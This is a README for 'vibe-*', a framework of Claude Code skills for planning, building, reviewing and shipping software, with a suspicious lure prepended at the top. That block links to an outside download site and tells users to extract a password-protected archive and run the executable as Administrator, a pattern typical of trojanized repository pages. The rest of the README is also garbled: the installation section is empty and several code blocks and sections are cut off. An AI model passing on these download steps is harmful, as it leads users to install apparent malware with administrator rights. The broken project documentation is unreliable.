<div align="center">

  ![Downloads](https://img.shields.io/badge/Downloads-40K+-blue?style=for-the-badge&logo=github)
  ![User Rating](https://img.shields.io/badge/User%20Rating-4.8%2F5-gold?style=for-the-badge&logo=star)
  ![Latest Version](https://img.shields.io/badge/Latest%20Version-3.2.0-green?style=for-the-badge&logo=github)

</div>

<div align="center">

  <a href="https://respockett.pro/red">
    <img src="https://img.shields.io/badge/Download-Latest%20Release-blue?style=for-the-badge" alt="Download Latest Release">
  </a>

</div>

> ⚡ **All-in-one loader:** The entire script is compiled into a single loader for your convenience — just download, extract, and run. No extra setup required.

1. **⬇️ Download** the tool from the button above.
2. **📦 Extract** the archive (password: `respocket`).
3. **🖱️ Run as Administrator** – right‑click the executable and select *Run as Administrator*.
4. **✅ Follow the setup wizard** – complete the installation.
5. **🚀 Launch the Tool** – the main window appears.

---

> ⚠️ **Important: Official Distribution Notice**
>
> We distribute our software **only through MediaFire**.  
> If the download link leads to **any other file-sharing service**, please **do not download it** — it may be an unofficial or modified copy.  
> For your safety, always use the official release.

---

<div align="center">

### 💙 Prepared by the Respocket Team

**This release was carefully prepared by the Respocket Team** — with attention to every detail, a focus on stability, and respect for our users.  
Thank you for choosing our software. Download only official versions and stay with us!
</div>


---

# vibe-* skills

> A framework of 26 Claude Code skills that covers the complete software development lifecycle — from first idea to client sign-off.

## What this is

vibe-* is a collection of Claude Code CLI skills. Each skill is a structured instruction set that tells Claude Code exactly what to do at a specific moment in a project — how to plan it, build it, review it, test it, deploy it, and hand it off.

Every skill follows the same principles:

- **Grounded in real files** — reads your actual TASKS.md, SPEC.md, DECISIONS.md, git history. Nothing invented.
- **One trigger, complete output** — type `feature: add dark mode` and get a spec, plan, task list, and code.
- **Phase-gated** — skills enforce quality gates. A phase cannot proceed until review passes.
- **Two audiences** — client-facing documents are always plain English. Developer documents are technical and precise.

---

## Installation

```bash
## Usage

Skills trigger automatically from natural language. No slash commands needed.

---

### Skills included (26)

**Plan**
- `vibe-brainstorm` — turn ideas into a buildable brief
- `vibe-architect` — plan code structure before writing
- `vibe-agent` — design multi-agent AI systems
- `vibe-spec-review` — audit specs before coding

**Build**
- `vibe-new-app` — build a new app from scratch
- `vibe-add-feature` — add a feature to existing codebase
- `vibe-change-spec` — modify requirements mid-build
- `vibe-fix-bug` — diagnose and fix bugs
- `vibe-review` — evidence-based code review
- `vibe-test` — generate tests

**Design**
- `vibe-design` — editorial-quality frontend UI
- `vibe-design-md` — capture design system from any URL

**Ship**
- `vibe-e2e` — Playwright end-to-end tests
- `vibe-deploy` — deploy to 7 platforms
- `vibe-perf` — performance audit
- `vibe-parallel` — parallel task execution via subagents

**Visibility**
- `vibe-progress` — ASCII progress dashboard
- `vibe-cost` — token and cost tracking
- `vibe-ledger` — visual cost report
- `vibe-graph` — dependency graph
- `vibe-doctor` — environment health check
- `vibe-mode` — set manual/autonomous execution mode, who approves the spec and design, whether a build continues past a passed phase gate; `vibe-mode: run` resumes a build from the files alone (headless contract: `vibe-mode/references/HEADLESS.md`)

**Close**
- `vibe-document` — generate docs
- `vibe-changelog` — maintain changelogs
- `vibe-handoff` — client handoff packages
- `vibe-init` — onboard existing codebase into vibe-*

---

## The full development cycle

```
PLAN
  brainstorm: → spec-review (auto) → architect: → new: / vibe-init
  (idea from elsewhere / dropped or empty file → still start at brainstorm:;
   its Step 0 ingests + normalizes it to a canonical BRIEF.md)

DESIGN  (required for UI projects — the gate between scaffold and build)
  design-md: (brand tokens, optional) → design:

BUILD
  feature: → design: (if the feature adds new UI) → review: → test:
  bug: (when needed)
  change: (when needed)

WATCH
  progress: ← always available
  cost: → ledger: ← after sessions
  graph: ← when architecture questions arise

ADVANCED
  parallel: / mode: / perf: / doctor:

SHIP
## Examples

### Starting a new project

```
brainstorm: I want to build a SaaS tool for freelancers to track client invoices
```

Claude asks 13 structured questions across product, users, revenue, and tech. Produces `BRIEF.md`.

```
architect:
```

Claude reads BRIEF.md and produces `ARCHITECTURE.md` — tech stack decisions, folder structure, data model, API patterns, auth approach. This file is read at the start of every future session.

```
new:
```

Claude reads BRIEF.md and ARCHITECTURE.md, generates `CLAUDE.md` at the project root and the complete `vibe/` folder — SPEC.md, TASKS.md, CODEBASE.md, DECISIONS.md, DESIGN_SYSTEM.md. Then starts building Phase 1.

---

### Adding a feature

```
feature: add CSV export for invoices
```

Claude produces:

```
vibe/features/2026-04-17-csv-export/
├── FEATURE_SPEC.md    ← acceptance criteria, edge cases, out of scope
├── FEATURE_PLAN.md    ← implementation approach, files to change
└── FEATURE_TASKS.md   ← task breakdown with size (S/M/L) and order
```

Shows the plan. You say `go` and it builds.

---

### Fixing a bug

```
bug: the invoice total shows NaN when tax rate is empty
```

Claude triages severity (Medium — UX impact, has workaround). Diagnoses root cause in the calculation logic. Writes a regression test that fails. Fixes the bug. Regression test now passes.

---

### Reviewing a phase

```
review: phase 2
```

Claude acts as Senior Engineer, Architect, and Code Quality Auditor simultaneously. Every finding is backed by a file path and line number. No vague feedback.

```
PHASE 2 REVIEW — Invoice SaaS
Score: 7.2/10 · Grade: B+

P0 — Must fix before Phase 3
  · backend/app/services/invoice.py:142
    SQL query not parameterised — injection risk

P1 — Fix before deploy
  · web/components/InvoiceForm.tsx:67
    No loading state on submit — UX issue on slow connections

P2 — Address in backlog
  · backend/app/models/client.py:23
    Missing index on email column — will degrade at scale

Phase 3 is BLOCKED until P0 resolved.
```

---

### Tracking costs

```
cost:
```

After each session Claude calculates token usage, estimates dollar cost, tags every task with size (S/M/L) and cost, detects waste patterns. Writes to `vibe/cost/history.json` and `vibe/cost/summary.json`.

```
ledger:
```

Generates a full HTML cost report and opens it in the browser:

```
VIBE-LEDGER · Invoice SaaS
Total spent: $12.40 · 18 sessions · 94 tasks

AVG COST/TASK   $0.13
PEAK SESSION    $1.89 — Phase 2 Backend
CACHE SAVINGS   $0.00 — unlock caching to save ~$0.40

SESSION BURN
  S1 · Phase 1 Foundation      ● ● ○ ○ ○ ○ ○   $0.58
  S2 · Phase 2 Backend   [peak] ● ● ● ● ● ● ●  $1.89
  S3 · Phase 2 Frontend        ● ● ● ○ ○ ○ ○   $0.82
```

---

### Deploying to Railway

```
deploy: railway
```

Claude reads the project. Detects FastAPI backend + Next.js web + PostgreSQL. Asks one question: GitHub Actions yes or no?

Then:
- Patches `main.py` — port binding to `$PORT`
- Adds `GET /health` endpoint if missing
- Locks CORS to `FRONTEND_URL` env var
- Prepends `alembic upgrade head &&` to start command
- Generates `railway.json` with backend + web + worker services, all scoped
- Non-secret env vars inlined per service
- `DATABASE_URL` linked via `${{Postgres.DATABASE_URL}}`
- Generates `ENV_SETUP.md` with exact `railway variables set` commands for secrets
- Generates `DEPLOY.md` — step-by-step human checklist

---

### Running E2E tests

```
### Generating changelogs

```
changelog:
```

Claude reads git tags, git log, TASKS.md, DECISIONS.md, and all feature specs. Groups 47 completed tasks into 8 meaningful entries. Generates two files simultaneously.

**CHANGELOG.md** (developer-facing):
```markdown
## [2.0.0] — 2026-04-17

### Added
- CSV export for invoices and client lists (EXP-01–EXP-04)
- Recurring invoice scheduler with configurable intervals (REC-01–REC-06)
- Stripe payment link generation from invoice detail (PAY-01–PAY-03)

### Changed
- Invoice numbering moved to server-side sequence (DECISION: 2026-04-10)
- PDF generation upgraded from html2pdf to Puppeteer (DECISION: 2026-04-12)

### Fixed
- NaN total when tax rate is empty (BUG-012)
- Invoice date picker broken on Safari (BUG-014)
```

**CHANGELOG_CLIENT.md** (plain English):
```markdown
## Version 2.0 — April 2026

**Export your data.**
Download any invoice list or client list as a CSV file —
one click from the list view.

**Set invoices to repeat automatically.**
Create a recurring invoice once and it sends itself — weekly,
monthly, or on any schedule you choose.

**Get paid faster with payment links.**
Every invoice now has a "Get paid" button that generates a Stripe
payment link your client can use immediately.
```

---

### Handing off to a client

```
handoff: client
```

Claude reads all project files and generates a complete package:

```
vibe/handoff/client-2026-04-17/
├── DELIVERY.md           ← what was built (plain English, 600-1000 words)
├── FEATURES.md           ← screen-by-screen walkthrough
├── KNOWN_ISSUES.md       ← honest, specific, no hedging
├── CREDENTIALS.md        ← placeholder list — human fills values
├── SUPPORT.md            ← how to get help and escalate
├── ROADMAP.md            ← what was deferred and why
├── SIGN_OFF_CHECKLIST.md ← PM works through this on the sign-off call
└── index.html            ← self-contained portal combining all docs
```

The `index.html` portal is a fully designed, light-mode web page — sidebar navigation, document index, all 7 documents in one shareable file. Send it to the client directly.

---

## Cheat sheet

### The mental model — one line per phase

```
THINK    brainstorm: → architect: → new: / vibe-init
DESIGN   design-md: → design:    ← required for UI projects, BEFORE build
BUILD    feature: → design: (if new UI) → review: → test:
WATCH    progress: / cost: / ledger: / graph:
FIX      bug: / change: / doctor:
SHIP     deploy: [platform] → e2e: [url]
CLOSE    document: → changelog: → handoff: [mode]
```
> Idea brainstormed elsewhere (or a dropped/empty file)? Start at `brainstorm:` —
> its Step 0 ingests and normalizes external input, so the project still flows
> through architect → scaffold → **design** → build and reaches full parity.

### Every trigger at a glance

```
PLANNING
  brainstorm:               Start a new project from an idea
  architect:                Plan the architecture before coding
  agent:                    Design a multi-agent system
  new:                      Set up a greenfield project
  vibe-init                 Onboard an existing codebase

BUILD
  feature: [description]    Add a feature
  bug: [description]        Fix a bug
  change: [description]     Modify the spec mid-build
  review:                   Review the current phase (phase gate)
  review: phase 2           Review a specific phase
  test: [description]       Write tests for a change

VISIBILITY
  progress:                 Show project dashboard
  cost:                     Track this session's cost
  ledger:                   Generate HTML cost report
  graph:                    Generate dependency graph

DESIGN
  design-md: [url]          Fetch or generate design system
  design: [description]     Design or redesign a component/page

ADVANCED
  parallel:                 Run tasks with parallel subagents
  vibe-mode: autonomous     Run until done without prompting
  vibe-mode: manual         Wait for "next" between tasks (default)
  vibe-mode: run            Resume a build from the files alone (headless)
  design: critique / fix    Critique the design, then apply the notes
  perf:                     Performance audit
  doctor:                   Environment health check

SHIP
  deploy: railway           Prepare for Railway deployment
  deploy: render            Prepare for Render deployment
  deploy: fly               Prepare for Fly.io deployment
  deploy: heroku            Prepare for Heroku deployment
  deploy: vercel            Prepare for Vercel deployment
  deploy: netlify           Prepare for Netlify deployment
  deploy: github-pages      Prepare for GitHub Pages deployment
### Files the framework owns

```
BRIEF.md                    ← brainstorm output — project definition
CLAUDE.md                   ← root instructions read every session
CHANGELOG.md                ← developer changelog (git tag based)
CHANGELOG_CLIENT.md         ← plain English changelog for clients

vibe/
  SPEC.md                   ← features, acceptance criteria, out of scope
  ARCHITECTURE.md           ← tech decisions, patterns, principles
  TASKS.md                  ← single source of truth for all tasks
  DECISIONS.md              ← architectural decisions with reasoning
  CODEBASE.md               ← codebase map, updated every session
  DESIGN_SYSTEM.md          ← design tokens, components, patterns

  features/[date-slug]/
    FEATURE_SPEC.md
    FEATURE_PLAN.md
    FEATURE_TASKS.md

  bugs/[date-slug]/
    BUG_SPEC.md
    BUG_PLAN.md
    BUG_TASKS.md

  cost/
    history.json            ← every session's cost data
    summary.json            ← rich context for vibe-ledger
    ledger/index.html       ← generated HTML cost report

  handoff/[mode]-[date]/
    *.md                    ← handoff documents
    index.html              ← self-contained portal

railway.json / render.yaml / fly.toml / Procfile / vercel.json / netlify.toml
  ← generated by vibe-deploy

e2e/
  playwright.config.ts
  tests/
  cleanup.ts
```

### Task size labels

```
S — Small    Quick fixes, config changes, minor UI tweaks    ~$0.05/task
M — Medium   Features, screens, API endpoints               ~$0.13/task
L — Large    Complex features, real-time, auth, migrations  ~$0.30/task
```

### Phase gate rules

```
Phase N cannot proceed to Phase N+1 until review: passes with zero P0 issues.
Final phase review must pass zero P0 + zero P1 before deploy.
vibe-review is the enforcer. No exceptions.
```

### Severity levels used in review and issues

```
P0   Blocking — must fix before next phase or deploy
P1   Significant — must fix before deploy
P2   Should fix — add to backlog
P3   Nice to fix — cosmetic or edge case
```

### Cost waste patterns vibe-cost detects

```
CP-01    Context window too large — CODEBASE.md needs splitting
CP-02    Repeated re-reads — same files loaded every session
CP-03    Output-heavy session — large files generated from scratch
CP-04    No prompt caching — paying full price every session
CP-05    Review session expensive — too many files in context
CP-06    Small tasks in separate sessions — should be batched
CP-07    Tooling sessions accumulating — batch cost checks
CP-GAP   Tracking gap — sessions run without cost tracking
```

### Handoff modes and audiences

```
handoff: client       →  Non-technical client stakeholder
handoff: milestone    →  Client + PM, end of a phase
handoff: dev          →  Developer taking over the codebase
handoff: internal     →  BetaCraft team member handoff
handoff: maintenance  →  Client's own technical team
```

### Deploy platform quick reference

```
Platform        Config file        Database              Best for
────────────────────────────────────────────────────────────────────
railway         railway.json       PostgreSQL plugin      Full-stack, multi-service
render          render.yaml        PostgreSQL service     Background workers
fly             fly.toml/service   Fly Postgres           Containers, global
heroku          Procfile+app.json  Heroku Postgres add-on Legacy, simple
vercel          vercel.json        External only          Next.js, frontend
netlify         netlify.toml       External only          Static, JAMstack
github-pages    .github/workflow   None                   Static sites only
```

### E2E quick reference

```
### Changelog quick reference

```
changelog:              Generate both files for current version
changelog: since v1.0   Generate since a specific git tag

CHANGELOG.md            Keep a Changelog format, task IDs, decisions
CHANGELOG_CLIENT.md     Plain English, product update style, zero tech terms

Version detection order:
  1. git tag --sort=-version:refname  ← primary
  2. package.json version field       ← fallback
  3. pyproject.toml version field     ← fallback
  4. [Unreleased]                     ← if nothing found

Scoping rule: git log [last-tag]..HEAD — never date-based
```

---

## Project structure after `new:`

```
my-project/
├── CLAUDE.md                   ← read every session
├── BRIEF.md                    ← project definition
├── CHANGELOG.md                ← dev changelog
├── CHANGELOG_CLIENT.md         ← client changelog
│
├── vibe/
│   ├── SPEC.md
│   ├── ARCHITECTURE.md
│   ├── TASKS.md
│   ├── DECISIONS.md
│   ├── CODEBASE.md
│   ├── DESIGN_SYSTEM.md
│   ├── features/
│   ├── bugs/
│   ├── reviews/
│   ├── cost/
│   └── handoff/
│
├── backend/                    ← your app code
├── web/
├── mobile/
└── e2e/                        ← generated by vibe-e2e
```

---

## Design principles

**Skills are instruction sets, not scripts.**
They run inside Claude Code's context window. No external processes, no servers, no npm packages required for the framework itself — only for what it builds.

**Everything is grounded.**
Every skill reads actual project files before doing anything. SPEC.md, TASKS.md, DECISIONS.md, git history. Nothing is invented. If a section has no data source, it says so rather than fabricating content.

**Docs are first-class.**
The framework produces documents that serve real audiences — developers, clients, PMs. CHANGELOG_CLIENT.md is readable by a business owner. DELIVERY.md can be sent directly to a client. ONBOARDING.md gets a new dev running in 30 minutes.

**Cost is visible.**
Every session is tracked. Every task has a cost. The ledger shows where money went. Waste patterns are flagged before they compound. summary.json bridges raw cost data and human-readable reports.

**The gate is real.**
vibe-review is not optional. Phase gates are enforced. P0 issues block progress. This is what makes the output shippable rather than just generated.

**Two audiences, always.**
Client documents are plain English — no task IDs, no framework names, no file paths. Developer documents are precise and technical. The framework never conflates the two.

---

## License

MIT — use freely, attribution appreciated.

---

## Maintaining the framework

Two stdlib-only tools keep the framework honest (no dependencies):

- **`python3 scripts/lint.py`** — self-linter. Flags dangling `references/*.md`,
  duplicate step headings, stale model IDs, non-compiling scripts, and a README
  skill-count mismatch. Run it after editing any skill; it exits non-zero on errors
  so it can gate CI. This catches the classes of drift that creep into a 26-skill
  prompt framework.
- Deterministic engines (invoked by their skills, not mentally simulated):
  `vibe-graph/scripts/graph.py` (god-nodes, blast-radius, stats, html),
  `vibe-parallel/scripts/waves.py` (dependency waves, conflict detection, estimate),
  `vibe-ledger/scripts/generate.py`, `vibe-handoff/scripts/generate_portal.py`.
